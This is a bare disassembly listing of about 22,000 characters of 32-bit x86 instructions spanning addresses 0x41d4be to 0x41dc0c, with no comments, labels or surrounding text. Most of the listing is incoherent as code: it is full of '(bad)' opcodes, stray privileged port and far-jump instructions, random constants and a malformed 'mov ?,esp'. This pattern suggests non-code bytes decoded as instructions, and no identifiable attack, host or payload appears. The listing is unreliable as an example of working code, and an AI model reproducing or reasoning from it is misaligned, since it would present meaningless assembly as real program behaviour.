  41d4be:	inc    ebp
  41d4bf:	jne    0x41d486
  41d4c1:	push   ebp
  41d4c2:	inc    ebp
  41d4c3:	jne    0x41d482
  41d4c5:	dec    ebx
  41d4c6:	inc    ebp
  41d4c7:	jne    0x41d542
  41d4c9:	add    DWORD PTR [ebp+0x75],0x1d
  41d4cd:	jl     0x41d514
  41d4cf:	add    BYTE PTR [eax],al
  41d4d1:	add    BYTE PTR [eax],al
  41d4d3:	add    BYTE PTR [ebp+0x57],dh
  41d4d6:	jae    0x41d51d
  41d4d8:	jne    0x41d49f
  41d4da:	imul   eax,DWORD PTR [ebp+0x75],0xffffffb2
  41d4de:	arpl   WORD PTR [ebp+0x75],ax
  41d4e1:	je     0x41d53e
  41d4e3:	inc    ebp
  41d4e4:	jne    0x41d4fc
  41d4e6:	inc    edi
  41d4e7:	inc    ebp
  41d4e8:	jne    0x41d4e2
  41d4ea:	inc    esi
  41d4eb:	inc    ebp
  41d4ec:	jne    0x41d48e
  41d4ee:	test   DWORD PTR [ebp+0x75],eax
  41d4f1:	(bad)  
  41d4f2:	xchg   BYTE PTR [ebp+0x75],al
  41d4f5:	inc    esp
  41d4f6:	xchg   DWORD PTR [ebp+0x75],eax
  41d4f9:	dec    ebp
  41d4fa:	xchg   DWORD PTR [ebp+0x75],eax
  41d4fd:	cmp    al,0x87
  41d4ff:	inc    ebp
  41d500:	jne    0x41d4a6
  41d502:	mov    BYTE PTR [ebp+0x75],al
  41d505:	sbb    eax,0x3e754589
  41d50a:	mov    DWORD PTR [ebp+0x75],eax
  41d50d:	gs dec eax
  41d50f:	inc    ebp
  41d510:	jne    0x41d568
  41d512:	dec    eax
  41d513:	inc    ebp
  41d514:	jne    0x41d574
  41d516:	dec    eax
  41d517:	inc    ebp
  41d518:	jne    0x41d4e6
  41d51a:	dec    eax
  41d51b:	inc    ebp
  41d51c:	jne    0x41d550
  41d51e:	arpl   WORD PTR [ebp+0x75],ax
  41d521:	punpckldq mm0,DWORD PTR [ebp+0x75]
  41d525:	(bad)  
  41d528:	mov    eax,0xb05b1b02
  41d52d:	add    dh,BYTE PTR [ebp+0x6f02b97a]
  41d533:	jne    0x41d4e6
  41d535:	add    bl,al
  41d537:	jns    0x41d539
  41d539:	add    BYTE PTR [eax],al
  41d53b:	add    BYTE PTR [eax],al
  41d53d:	mov    ecx,0xb1786502
  41d542:	add    bh,cl
  41d544:	pop    eax
  41d545:	mov    ecx,0xb15bcc02
  41d54a:	add    bl,BYTE PTR [edi]
  41d54c:	cmp    DWORD PTR [ecx-0x4e7cf9fe],0x2
  41d553:	pop    ds
  41d554:	jne    0x41d50f
  41d556:	add    dl,al
  41d558:	jp     0x41d50b
  41d55a:	add    dl,BYTE PTR [edx]
  41d55c:	jge    0x41d517
  41d55e:	add    bl,BYTE PTR [edx]
  41d560:	inc    edx
  41d561:	mov    cl,0x2
  41d563:	int3   
  41d564:	push   edx
  41d565:	cmp    DWORD PTR [edx],eax
  41d567:	pop    es
  41d568:	dec    ebp
  41d569:	xor    DWORD PTR [edx],eax
  41d56b:	push   ebx
  41d56c:	inc    ebp
  41d56d:	cmp    DWORD PTR [edx],eax
  41d56f:	xchg   ebx,eax
  41d570:	cmp    eax,0x95de0231
  41d575:	cmp    DWORD PTR [edx],eax
  41d577:	sbb    DWORD PTR [ecx+esi*1+0x39828d02],ecx
  41d57e:	add    ah,BYTE PTR [esi+esi*2+0x31]
  41d582:	add    bl,BYTE PTR [edx]
  41d584:	pop    ecx
  41d585:	cmp    DWORD PTR [edx],eax
  41d587:	push   ebp
  41d588:	push   ebp
  41d589:	xor    DWORD PTR [edx],eax
  41d58b:	sar    BYTE PTR [ecx+edi*1+0x2],0x0
  41d590:	call   0xed45d909
  41d595:	jne    0x41d59b
  41d597:	add    eax,0x90b89f1
  41d59c:	in     eax,0x8a
  41d59e:	inc    esp
  41d59f:	inc    edi
  41d5a0:	fadd   QWORD PTR [eax]
  41d5a2:	add    BYTE PTR [eax],al
  41d5a4:	add    BYTE PTR [eax],al
  41d5a6:	or     BYTE PTR [esi],0x10
  41d5a9:	add    BYTE PTR [ebp-0x22],cl
  41d5ac:	adc    DWORD PTR [ebx],edx
  41d5ae:	inc    eax
  41d5af:	repnz adc eax,0x1a0e4417
  41d5b5:	sbb    al,BYTE PTR [esi+0xb]
  41d5b8:	sbb    bl,BYTE PTR [edx]
  41d5ba:	ja     0x41d5c7
  41d5bc:	sbb    al,0x1d
  41d5be:	dec    edx
  41d5bf:	push   es
  41d5c0:	and    BYTE PTR [ecx],ah
  41d5c2:	ins    DWORD PTR es:[edi],dx
  41d5c3:	mov    eax,ds:0xa06d211d
  41d5c8:	push   ds
  41d5c9:	and    eax,DWORD PTR [eax-0x7bd8dd43]
  41d5cf:	mov    esi,0xbe742824
  41d5d4:	and    eax,0x28bb7629
  41d5d9:	sub    eax,0x4944d82a
  41d5de:	inc    ebp
  41d5df:	fld    DWORD PTR [ecx+ecx*2+0x55]
  41d5e3:	mov    bh,0x2b
  41d5e5:	dec    ecx
  41d5e6:	sbb    al,0x90
  41d5e8:	xor    esi,DWORD PTR cs:[eax]
  41d5eb:	lods   eax,DWORD PTR ds:[esi]
  41d5ec:	xor    BYTE PTR ds:0x3732ac22,dh
  41d5f2:	and    al,0xa8
  41d5f4:	cmp    esp,DWORD PTR ss:0x54937ab
  41d5fb:	fadd   DWORD PTR [ecx+ecx*2+0x68]
  41d5ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d600:	cmp    bh,BYTE PTR [edi]
  41d602:	or     al,0x40
  41d604:	inc    edx
  41d605:	inc    ebx
  41d606:	adc    ah,bl
  41d608:	inc    ebp
  41d609:	add    BYTE PTR [eax],al
  41d60b:	add    BYTE PTR [eax],al
  41d60d:	add    BYTE PTR [eax],al
  41d60f:	jecxz  0x41d5e9
  41d611:	(bad)  
  41d612:	sub    al,0xf1
  41d614:	inc    eax
  41d615:	add    BYTE PTR [eax-0xf],ch
  41d618:	inc    eax
  41d619:	add    BYTE PTR [ecx+esi*8+0x41e00040],ah
  41d620:	inc    ecx
  41d621:	add    BYTE PTR [ecx],bl
  41d623:	xor    al,BYTE PTR [ecx+0x0]
  41d626:	dec    esi
  41d627:	jne    0x41d676
  41d629:	inc    ecx
  41d62a:	add    BYTE PTR [ebp+0x48],al
  41d62d:	inc    ecx
  41d62e:	add    BYTE PTR [ebx],bl
  41d630:	dec    ecx
  41d631:	inc    ecx
  41d632:	add    BYTE PTR [ebx],dl
  41d634:	dec    ecx
  41d635:	inc    ecx
  41d636:	add    BYTE PTR [ebp+ebx*8-0x2a6bffc0],dl
  41d63d:	inc    eax
  41d63e:	add    BYTE PTR [edi],cl
  41d640:	mov    DWORD PTR [ecx+0x0],eax
  41d643:	imul   eax,DWORD PTR [ebp-0x7226ffbf],0x86110041
  41d64d:	inc    ecx
  41d64e:	add    BYTE PTR ds:0xdb00418e,bl
  41d654:	jno    0x41d697
  41d656:	add    BYTE PTR ds:0x87004182,dl
  41d65c:	add    BYTE PTR [ecx+0x0],0xb9
  41d660:	xor    al,BYTE PTR [edx+0x0]
  41d663:	xor    DWORD PTR [edx],0x42
  41d666:	add    ch,cl
  41d668:	inc    edx
  41d669:	inc    edx
  41d66a:	add    dl,cl
  41d66c:	inc    ebx
  41d66d:	inc    edx
  41d66e:	add    BYTE PTR [eax+0x4c],bh
  41d671:	inc    edx
  41d672:	add    BYTE PTR [eax],al
  41d674:	add    BYTE PTR [eax],al
  41d676:	add    BYTE PTR [eax],al
  41d678:	jo     0x41d6be
  41d67a:	inc    edx
  41d67b:	add    BYTE PTR [ebp+ebx*8-0x2a6bffbf],dl
  41d682:	inc    ecx
  41d683:	add    BYTE PTR [eax-0x74],dl
  41d686:	inc    ecx
  41d687:	add    bh,cl
  41d689:	test   BYTE PTR [ecx+0x0],al
  41d68c:	call   0x4181:0x4b004181
  41d693:	add    al,bl
  41d695:	jno    0x41d6d8
  41d697:	add    BYTE PTR [esi+0x16],cl
  41d69a:	inc    edx
  41d69b:	add    BYTE PTR [ecx],bl
  41d69d:	push   ds
  41d69e:	inc    edx
  41d69f:	add    BYTE PTR [eax],cl
  41d6a1:	push   ss
  41d6a2:	inc    edx
  41d6a3:	add    BYTE PTR [ebx],cl
  41d6a5:	add    bl,BYTE PTR [edx+eax*2+0x75]
  41d6a9:	sbb    edx,DWORD PTR [edx+eax*2+0x75]
  41d6ad:	mov    bl,BYTE PTR [ebx+0x42]
  41d6b0:	jne    0x41d727
  41d6b2:	push   ebx
  41d6b3:	inc    edx
  41d6b4:	jne    0x41d72b
  41d6b6:	cmp    eax,DWORD PTR [edx+0x75]
  41d6b9:	jne    0x41d6ee
  41d6bb:	inc    edx
  41d6bc:	jne    0x41d69f
  41d6be:	cmp    al,BYTE PTR [edx+0x75]
  41d6c1:	loope  0x41d6f5
  41d6c3:	inc    edx
  41d6c4:	jne    0x41d71b
  41d6c6:	call   0x7545:0x94017545
  41d6cd:	clc    
  41d6ce:	fwait
  41d6cf:	inc    ebp
  41d6d0:	jne    0x41d6a3
  41d6d2:	xchg   ebx,eax
  41d6d3:	inc    ebp
  41d6d4:	jne    0x41d71a
  41d6d6:	jl     0x41d71d
  41d6d8:	jne    0x41d70f
  41d6da:	jb     0x41d68c
  41d6dc:	add    BYTE PTR [eax],al
  41d6de:	add    BYTE PTR [eax],al
  41d6e0:	add    BYTE PTR [ebx+0x7504faae],ah
  41d6e6:	add    ch,BYTE PTR [edx+0x51]
  41d6e9:	or     DWORD PTR [ebx-0x64faae97],ebx
  41d6ef:	imul   edx,DWORD PTR [ecx+0x31],0x9f8f399b
  41d6f6:	or     dh,BYTE PTR ds:0x7232c4d7
  41d6fc:	pushf  
  41d6fd:	(bad)  
  41d6fe:	ds jle 0x41d68e
  41d701:	inc    edi
  41d702:	mov    ds:0x88ad395f,al
  41d707:	adc    eax,eax
  41d709:	sti    
  41d70a:	cmp    al,0x63
  41d70c:	lea    esp,[edi]
  41d70e:	stos   BYTE PTR es:[edi],al
  41d70f:	outs   dx,DWORD PTR ds:[esi]
  41d710:	dec    ecx
  41d711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d712:	xchg   BYTE PTR [ebp-0x21],bl
  41d715:	mov    esp,0x79e8630a
  41d71a:	add    ah,bh
  41d71c:	fmulp  st(4),st
  41d71e:	or     ah,BYTE PTR [ebx+0x0]
  41d721:	js     0x41d725
  41d723:	add    cl,ch
  41d725:	mov    ecx,0x81b4102f
  41d72a:	rcl    DWORD PTR [edx-0x3],cl
  41d72d:	lea    ecx,[di]
  41d730:	out    0x76,al
  41d732:	add    dh,BYTE PTR [edi]
  41d734:	mov    esp,0x83051782
  41d739:	or     DWORD PTR [ecx+0x276ee03],esp
  41d73f:	or     eax,0xfaae36
  41d744:	add    BYTE PTR cs:[eax],al
  41d747:	add    BYTE PTR [eax],al
  41d749:	add    al,ch
  41d74b:	test   BYTE PTR [edi-0x12],cl
  41d74e:	pop    ss
  41d74f:	xchg   edi,eax
  41d750:	or     al,0x9e
  41d752:	mov    edi,0xae6486f6
  41d757:	xchg   edi,eax
  41d758:	cld    
  41d759:	(bad)  
  41d75a:	addr16 dec edi
  41d75c:	inc    esp
  41d75d:	repz add DWORD PTR [ebp-0x692839b5],eax
  41d764:	mov    bh,0x29
  41d766:	mov    ebx,0xed600007
  41d76b:	in     eax,dx
  41d76c:	cld    
  41d76d:	scas   al,BYTE PTR es:[edi]
  41d76e:	xlat   BYTE PTR ds:[ebx]
  41d76f:	add    BYTE PTR [edx-0x3692827],0x72
  41d776:	scas   eax,DWORD PTR es:[edi]
  41d777:	loop   0x41d6ff
  41d779:	cmp    al,0x31
  41d77b:	add    DWORD PTR [edx-0x6f],0xee72c3d3
  41d782:	mov    edi,0x8f51f844
  41d787:	inc    edx
  41d788:	add    BYTE PTR [eax-0x29],ch
  41d78b:	inc    esp
  41d78c:	push   edx
  41d78d:	sub    cl,BYTE PTR [ecx-0x28bd9f2]
  41d793:	int    0xfd
  41d795:	pop    esi
  41d796:	pop    ss
  41d797:	dec    edx
  41d798:	push   0xffffffe9
  41d79a:	in     eax,0x84
  41d79c:	test   DWORD PTR [edi-0x29],0x27004f96
  41d7a3:	int3   
  41d7a4:	in     al,0xd8
  41d7a6:	test   eax,0x5c8afffe
  41d7ab:	mov    dh,dl
  41d7ad:	jne    0x41d7af
  41d7af:	add    BYTE PTR [eax],al
  41d7b1:	add    BYTE PTR [eax],al
  41d7b3:	fwait
  41d7b4:	out    0xfb,eax
  41d7b6:	jmp    0x41e2ca
  41d7bb:	lahf   
  41d7bc:	dec    edi
  41d7bd:	xchg   DWORD PTR [esi-0x6c],eax
  41d7c0:	mov    ah,al
  41d7c2:	shl    DWORD PTR [edi+ecx*4-0x43],0xe9
  41d7c7:	pop    eax
  41d7c8:	sbb    ah,0x1
  41d7cb:	iret   
  41d7cc:	pop    esi
  41d7cd:	std    
  41d7ce:	mov    BYTE PTR [ecx],cl
  41d7d0:	push   ecx
  41d7d1:	or     esi,DWORD PTR [edi+0x4d85971a]
  41d7d7:	xor    al,0xf3
  41d7d9:	mov    dl,0x4e
  41d7db:	push   eax
  41d7dc:	(bad)  
  41d7dd:	in     eax,0x3
  41d7df:	iret   
  41d7e0:	gs std 
  41d7e2:	mov    cl,dl
  41d7e4:	stos   BYTE PTR es:[edi],al
  41d7e5:	sti    
  41d7e6:	push   DWORD PTR [ebx]
  41d7e8:	repz mov dl,0x4e
  41d7eb:	inc    eax
  41d7ec:	repnz stos BYTE PTR es:[edi],al
  41d7ee:	enter  0x3a13,0x43
  41d7f2:	sbb    BYTE PTR [ebp-0x4efc7027],dl
  41d7f8:	repnz dec dh
  41d7fb:	pinsrw mm0,WORD PTR [ebp+0x518d9045],0xb0
  41d803:	push   ebp
  41d804:	fst    DWORD PTR [ebx-0x42f96575]
  41d80a:	call   0x420785e8
  41d80f:	scas   eax,DWORD PTR es:[edi]
  41d810:	ret    
  41d811:	test   DWORD PTR [ebp-0x49e3c],eax
  41d817:	add    BYTE PTR [eax],al
  41d819:	add    BYTE PTR [eax],al
  41d81b:	add    BYTE PTR [edi+0x4c],al
  41d81e:	or     cl,al
  41d820:	and    al,0x7
  41d822:	pop    ds
  41d823:	shl    DWORD PTR [ebp+0x22],0x45
  41d827:	in     al,0xfc
  41d829:	sbb    eax,0x3faafd30
  41d82e:	mov    eax,DWORD PTR [ebp+0x6d]
  41d831:	jmp    0x8288:0xea561aab
  41d838:	or     eax,ebp
  41d83a:	sahf   
  41d83b:	cld    
  41d83c:	(bad)  
  41d83d:	push   0x18dbf08
  41d842:	jecxz  0x41d802
  41d844:	in     al,dx
  41d845:	and    eax,0x972fd14
  41d84a:	mov    eax,DWORD PTR [edx+0x6d]
  41d84d:	adc    eax,DWORD PTR [ebp-0x60669da9]
  41d853:	add    dh,BYTE PTR [ebp-0x3ffff54]
  41d859:	cs sub ch,bh
  41d85c:	dec    edx
  41d85d:	mov    eax,ds:0xb8cd9289
  41d862:	lahf   
  41d863:	cld    
  41d864:	in     al,dx
  41d865:	push   ss
  41d866:	sbb    eax,0x89c932fd
  41d86b:	push   edx
  41d86c:	cmc    
  41d86d:	adc    dh,BYTE PTR [esi]
  41d86f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d870:	in     al,dx
  41d871:	out    dx,al
  41d872:	xchg   DWORD PTR [esi+0x528965c0],eax
  41d878:	shl    DWORD PTR [edx],1
  41d87a:	xchg   BYTE PTR [ebx+0xa],bl
  41d87d:	popa   
  41d87e:	lahf   
  41d87f:	mov    BYTE PTR [eax],al
  41d881:	add    BYTE PTR [eax],al
  41d883:	add    BYTE PTR [eax],al
  41d885:	mov    ebx,0x695a8991
  41d88a:	inc    edx
  41d88b:	add    DWORD PTR [eax],eax
  41d88d:	cmc    
  41d88e:	stos   BYTE PTR es:[edi],al
  41d88f:	adc    al,0xa
  41d891:	mov    ah,0x71
  41d893:	mul    DWORD PTR [eax]
  41d895:	mov    ah,0x12
  41d897:	inc    esi
  41d898:	mov    dh,cl
  41d89a:	lods   al,BYTE PTR ds:[esi]
  41d89b:	mov    DWORD PTR [edx-0x3],edx
  41d89e:	and    al,0x47
  41d8a0:	or     BYTE PTR [eax+0x4503e702],dl
  41d8a6:	add    dl,cl
  41d8a8:	add    eax,0xdecd0e18
  41d8ad:	mov    dl,0x97
  41d8af:	test   BYTE PTR [ebx],0x21
  41d8b2:	xor    eax,DWORD PTR [esp+eax*1]
  41d8b5:	jne    0x41d899
  41d8b7:	out    0x17,al
  41d8b9:	xor    ch,dl
  41d8bb:	out    0x3,al
  41d8bd:	inc    ebp
  41d8be:	add    dh,BYTE PTR [ebx-0x18fdb00a]
  41d8c4:	inc    ebx
  41d8c5:	jne    0x41d8d5
  41d8c7:	mov    cl,0xde
  41d8c9:	jp     0x41d862
  41d8cb:	mov    dh,0x3
  41d8cd:	jmp    0x53ec59ad
  41d8d2:	jle    0x41d8bf
  41d8d4:	add    esi,DWORD PTR [ebp+0x5a]
  41d8d7:	lock push cs
  41d8d9:	jne    0x41d8dd
  41d8db:	pusha  
  41d8dc:	jbe    0x41d870
  41d8de:	xchg   edi,eax
  41d8df:	in     eax,dx
  41d8e0:	lahf   
  41d8e1:	(bad)  
  41d8e2:	xchg   edi,eax
  41d8e3:	out    0x3,al
  41d8e5:	jne    0x41d8ff
  41d8e7:	sbb    DWORD PTR [ebx+0x0],ecx
  41d8ed:	add    BYTE PTR [edx],dh
  41d8ef:	ror    edi,0xc
  41d8f2:	cli    
  41d8f3:	push   esp
  41d8f4:	and    bl,BYTE PTR [edi-0x6e9168d7]
  41d8fa:	(bad)  
  41d8fb:	xchg   edi,eax
  41d8fc:	mov    ebp,0x1b7cf29f
  41d901:	lahf   
  41d902:	adc    DWORD PTR [edi+0xc9ce9c1],edx
  41d908:	aas    
  41d909:	stos   DWORD PTR es:[edi],eax
  41d90a:	daa    
  41d90b:	sub    al,0xec
  41d90d:	stos   BYTE PTR es:[edi],al
  41d90e:	add    ecx,DWORD PTR [ecx-0x690fbbad]
  41d914:	lea    ebp,[ebx+0x44738986]
  41d91a:	loopne 0x41d8b2
  41d91c:	jge    0x41d8c9
  41d91e:	outs   dx,BYTE PTR ds:[esi]
  41d91f:	mov    edi,edi
  41d921:	arpl   WORD PTR ds:0xf96efc95,di
  41d927:	adc    DWORD PTR [ebx+0x66],0xffffffe2
  41d92b:	xchg   ebp,eax
  41d92c:	mov    BYTE PTR [edi-0x2857692],ah
  41d932:	div    DWORD PTR [esi-0x9039ffc]
  41d938:	cld    
  41d939:	inc    esi
  41d93a:	add    cl,BYTE PTR [edx+0x14f60c4]
  41d940:	push   edi
  41d941:	ds lock add eax,0xe984a7b5
  41d948:	stc    
  41d949:	(bad)  
  41d94a:	in     eax,dx
  41d94b:	push   esi
  41d94c:	jae    0x41d930
  41d94e:	out    dx,eax
  41d94f:	mov    esi,0x2e88
  41d954:	add    BYTE PTR [eax],al
  41d956:	add    BYTE PTR [edi+0x3b29703],bl
  41d95c:	fwait
  41d95d:	cmp    BYTE PTR [ecx],dh
  41d95f:	xchg   ebp,eax
  41d960:	jmp    0x2bb359ef
  41d965:	std    
  41d966:	jmp    0x9777:0x8bec6ff
  41d96d:	adc    ah,BYTE PTR [ecx+0x72004337]
  41d973:	(bad)  
  41d974:	jl     0x41d910
  41d976:	sbb    eax,0x64fc9712
  41d97b:	out    dx,eax
  41d97c:	adc    BYTE PTR ds:0xdf9cff53,al
  41d982:	in     eax,0x76
  41d984:	add    al,ch
  41d986:	sub    al,0xd9
  41d988:	xchg   esp,eax
  41d989:	cld    
  41d98a:	jmp    0x724a8505
  41d98f:	lods   eax,DWORD PTR ds:[esi]
  41d990:	xacquire xchg BYTE PTR [edx+eiz*1-0x69],ah
  41d995:	cld    
  41d996:	xchg   esi,eax
  41d997:	jmp    FWORD PTR [ebp+0x6ccbe58a]
  41d99d:	imul   eax,DWORD PTR [eax],0xf9f2d6cf
  41d9a3:	dec    edi
  41d9a4:	sub    bl,BYTE PTR [ebp-0x1]
  41d9a7:	dec    ebx
  41d9a8:	je     0x41d9a6
  41d9aa:	sub    BYTE PTR [ecx+0x12],0xfc
  41d9ae:	mov    DWORD PTR [ecx],ebx
  41d9b0:	mov    edx,0x861bfffb
  41d9b5:	cmp    DWORD PTR [ebx+ecx*2],0xffb74
  41d9bc:	add    BYTE PTR [eax],al
  41d9be:	add    BYTE PTR [eax],al
  41d9c0:	add    eax,DWORD PTR [eax+0x10]
  41d9c3:	(bad)  
  41d9c4:	rol    BYTE PTR [ecx],1
  41d9c6:	add    cl,BYTE PTR [ecx+0x453765d1]
  41d9cc:	mov    al,0xf7
  41d9ce:	dec    BYTE PTR [eax-0x247e9a27]
  41d9d4:	loopne 0x41d981
  41d9d6:	xchg   DWORD PTR [ebp+0x68],eax
  41d9d9:	push   ss
  41d9da:	sub    dl,al
  41d9dc:	dec    edi
  41d9dd:	push   ebx
  41d9de:	int    0xf8
  41d9e0:	push   ds
  41d9e1:	jb     0x41d9eb
  41d9e3:	mov    ebx,0x4895147
  41d9e8:	mov    ebp,0x704e580
  41d9ed:	leave  
  41d9ee:	outs   dx,BYTE PTR ds:[esi]
  41d9ef:	adc    bh,bl
  41d9f1:	push   es
  41d9f2:	sti    
  41d9f3:	and    DWORD PTR ds:0x9fc8370a,0x6c
  41d9fa:	xchg   DWORD PTR [ebp-0x48870],ebx
  41da00:	lahf   
  41da01:	cmc    
  41da02:	xlat   BYTE PTR ds:[ebx]
  41da03:	add    BYTE PTR [ecx-0x5b],ah
  41da06:	repnz inc esi
  41da08:	or     BYTE PTR [ebx],al
  41da0a:	je     0x41da33
  41da0c:	sbb    ebp,DWORD PTR [esi]
  41da0e:	inc    ebx
  41da0f:	adc    al,0x97
  41da11:	(bad)  
  41da12:	jge    0x41d9f5
  41da14:	(bad)  
  41da16:	(bad)  
  41da17:	dec    ebp
  41da19:	gs add al,0x83
  41da1c:	jne    0x41d9a9
  41da1e:	add    BYTE PTR [edi+0x42886f38],al
  41da24:	add    BYTE PTR [eax],al
  41da26:	add    BYTE PTR [eax],al
  41da28:	add    BYTE PTR [ebp-0xf76f26a],ch
  41da2e:	loop   0x41d9ca
  41da30:	cld    
  41da31:	rcr    BYTE PTR [ebx+0x227d0352],cl
  41da37:	inc    ebp
  41da38:	hlt    
  41da39:	retf   
  41da3a:	fs or  al,0x4
  41da3d:	inc    ecx
  41da3e:	std    
  41da3f:	or     dh,BYTE PTR [ebp-0x38786ac5]
  41da45:	mov    ah,0x42
  41da47:	or     al,0x7f
  41da49:	xchg   esp,eax
  41da4a:	cmp    eax,DWORD PTR [eax+eax*1]
  41da4d:	jne    0x41da77
  41da4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da50:	(bad)  
  41da51:	std    
  41da52:	gs mov esp,0xad33088
  41da58:	mov    dh,0xf9
  41da5a:	xchg   edx,eax
  41da5b:	add    bh,bh
  41da5d:	jp     0x41da09
  41da5f:	mov    DWORD PTR [edx+0x65],ecx
  41da62:	and    eax,DWORD PTR [ebp-0x34]
  41da65:	(bad)  
  41da66:	pop    esi
  41da67:	or     al,0x89
  41da69:	enter  0x88fd,0x42
  41da6d:	pop    ebp
  41da6e:	pop    ds
  41da6f:	mov    bh,0x73
  41da71:	ins    DWORD PTR es:[edi],dx
  41da72:	and    BYTE PTR [ebp-0x14],al
  41da75:	clc    
  41da76:	mov    ch,0x7f
  41da78:	cmp    BYTE PTR [ecx+edi*1],bl
  41da7b:	push   cs
  41da7c:	sub    DWORD PTR [esi],ebp
  41da7e:	rol    eax,cl
  41da80:	out    0x77,al
  41da82:	jmp    0xf098:0x212ac77e
  41da89:	into   
  41da8a:	sub    BYTE PTR [esi],bl
  41da8c:	aam    0x0
  41da8e:	add    BYTE PTR [eax],al
  41da90:	add    BYTE PTR [eax],al
  41da92:	jne    0x41da61
  41da94:	and    eax,0x35910f89
  41da99:	xchg   esp,eax
  41da9a:	xchg   BYTE PTR ds:0x2b5ba7f,al
  41daa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41daa1:	pushf  
  41daa2:	stc    
  41daa3:	add    dl,BYTE PTR [ebx]
  41daa5:	loop   0x41da98
  41daa7:	or     eax,0x6e3f888b
  41daac:	lea    edx,[esi-0x5e]
  41daaf:	xchg   ebx,eax
  41dab0:	test   DWORD PTR [edi+ebp*8-0x2e62dd93],ebx
  41dab7:	xchg   ebx,eax
  41dab8:	popa   
  41dab9:	(bad)  
  41daba:	rol    ch,cl
  41dabc:	lds    eax,FWORD PTR [edx]
  41dabe:	jne    0x41da47
  41dac0:	mov    ebx,0xd3c2f79f
  41dac5:	rcr    BYTE PTR [ebp+0x14661e7],1
  41dacb:	call   0x93e22233
  41dad0:	inc    ebp
  41dad1:	fsub   DWORD PTR [edx+0x7989dd0b]
  41dad7:	fsubr  DWORD PTR [ebx+0x37]
  41dada:	mov    BYTE PTR [ebx+0x7f69162d],dl
  41dae0:	arpl   WORD PTR [edi+0x78],ax
  41dae3:	xchg   ebx,eax
  41dae4:	sbb    eax,0x60f1e902
  41dae9:	inc    esp
  41daea:	push   0xffffffd9
  41daec:	arpl   WORD PTR [esi],si
  41daee:	pusha  
  41daef:	xchg   ebx,eax
  41daf0:	add    eax,0xc23b7317
  41daf5:	push   ds
  41daf6:	add    BYTE PTR [eax],al
  41daf8:	add    BYTE PTR [eax],al
  41dafa:	add    cl,ch
  41dafc:	cmovnp ecx,DWORD PTR [edx-0x3c45f931]
  41db03:	mov    edi,DWORD PTR ds:0xd9b618db
  41db09:	and    ecx,esp
  41db0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db0c:	int3   
  41db0d:	sar    esi,0x79
  41db10:	dec    esp
  41db11:	call   0xc67bcaa4
  41db16:	fwait
  41db17:	sbb    DWORD PTR [ebx],eax
  41db19:	jne    0x41db1b
  41db1b:	jge    0x41daf4
  41db1d:	jmp    FWORD PTR [ebx]
  41db1f:	in     eax,0x5
  41db21:	test   BYTE PTR [ebp+0x2b000279],bl
  41db27:	call   0xa624d75b
  41db2c:	push   es
  41db2d:	jb     0x41dab7
  41db2f:	sbb    BYTE PTR [ebp-0x1],dl
  41db32:	call   0xebf7e0ad
  41db37:	mov    ebx,0x52eef43f
  41db3c:	push   ecx
  41db3d:	(bad)  
  41db3e:	call   0x14c91bb9
  41db43:	fstp   st(1)
  41db45:	push   edx
  41db46:	cmc    
  41db47:	pusha  
  41db48:	test   eax,0x27985e6
  41db4d:	add    BYTE PTR [eax],dl
  41db4f:	hlt    
  41db50:	fdivp  st(4),st
  41db52:	dec    esi
  41db53:	inc    BYTE PTR ds:0x2716184
  41db59:	add    BYTE PTR [edx],al
  41db5b:	inc    esp
  41db5c:	jb     0x41db6a
  41db5e:	outs   dx,DWORD PTR ds:[esi]
  41db5f:	add    BYTE PTR [eax],al
  41db61:	add    BYTE PTR [eax],al
  41db63:	add    dh,bh
  41db65:	xchg   edx,eax
  41db66:	cld    
  41db67:	jmp    0x64c2fc3f
  41db6c:	xor    DWORD PTR [ebp+0x16791efc],edx
  41db72:	sub    dl,dl
  41db74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db75:	jb     0x41dbec
  41db77:	mov    ecx,0x72e414ff
  41db7c:	mov    ah,0x8e
  41db7e:	cld    
  41db7f:	je     0x41db47
  41db81:	jl     0x41db15
  41db83:	lods   eax,DWORD PTR ds:[esi]
  41db84:	out    dx,eax
  41db85:	mov    ?,esp
  41db87:	out    dx,al
  41db88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db89:	sar    esp,1
  41db8b:	out    0xdf,al
  41db8d:	test   eax,0x278067c
  41db92:	mov    DWORD PTR [ecx*1+0x4154bf85],edi
  41db99:	fwait
  41db9a:	sub    al,BYTE PTR [eax]
  41db9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db9d:	sub    al,BYTE PTR [ecx-0x1]
  41dba0:	shr    DWORD PTR [edi+eax*4+0x45],cl
  41dba4:	lods   al,BYTE PTR ds:[esi]
  41dba5:	or     bl,al
  41dba7:	cmp    ebx,esp
  41dba9:	neg    DWORD PTR ds:0xfae1818a
  41dbaf:	call   DWORD PTR [ebx]
  41dbb1:	cmp    DWORD PTR [esi+0x4ae1b2b],0xfb88dc75
  41dbbb:	add    eax,ebx
  41dbbd:	mov    eax,ds:0x6d698d86
  41dbc2:	sti    
  41dbc3:	inc    DWORD PTR [esi+edi*1]
  41dbc6:	std    
  41dbc7:	jae    0x41dbc9
  41dbc9:	add    BYTE PTR [eax],al
  41dbcb:	add    BYTE PTR [eax],al
  41dbcd:	aad    0x47
  41dbcf:	test   DWORD PTR [ebp+0x50],edx
  41dbd2:	mov    al,0x51
  41dbd4:	or     al,0xce
  41dbd6:	push   cs
  41dbd7:	jge    0x41dc53
  41dbd9:	inc    ebx
  41dbda:	cli    
  41dbdb:	jo     0x41dbfd
  41dbdd:	cvtpi2ps xmm7,QWORD PTR ds:0xfd6c33ff
  41dbe4:	jae    0x41db6b
  41dbe6:	mov    BYTE PTR [ecx-0x493bcc0],bh
  41dbec:	add    cl,cl
  41dbee:	sti    
  41dbef:	ss push ebp
  41dbf1:	cmp    al,0x4
  41dbf4:	adc    BYTE PTR [esi-0x1],0x70
  41dbf8:	add    al,0x1e
  41dbfa:	jle    0x41dc4d
  41dbfc:	cld    
  41dbfd:	xlat   BYTE PTR ds:[ebx]
  41dbfe:	jmp    0xc79:0x7ea533f7
  41dc05:	xor    eax,0xff75a43a
  41dc0a:	lods   eax,DWORD PTR ds:[esi]
  41dc0b:	dec    ecx
  41dc0c:	lock ror bl,1
